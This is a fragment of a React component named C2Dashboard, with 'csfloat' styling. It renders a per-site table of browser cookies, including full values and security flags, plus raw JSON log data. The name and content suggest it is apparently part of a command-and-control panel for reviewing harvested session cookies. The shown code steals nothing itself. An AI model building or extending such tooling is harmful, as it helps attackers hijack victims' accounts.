                                <tr key={idx} className="border-b border-csfloat-gray/10">
                                    <td className="px-2 py-1 font-mono text-csfloat-blue break-all">{cookie.name}</td>
                                    <td className="px-2 py-1 font-mono text-csfloat-light/90 break-all">{cookie.value}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.domain}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.path}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.expires || ''}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.http_only ? 'Yes' : 'No'}</td>
                                    <td className="px-2 py-1 font-mono">{cookie.secure ? 'Yes' : 'No'}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                    {sortedCookies.length === 0 && <div className="text-csfloat-light/70 py-4">No cookies for this site.</div>}
                </div>
            </div>
        );
    }

    return (
        <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
            <pre className="text-white text-sm whitespace-pre-wrap">
                {JSON.stringify(log.data, null, 2)}
            </pre>
        </div>
    );
};


export default C2Dashboard; 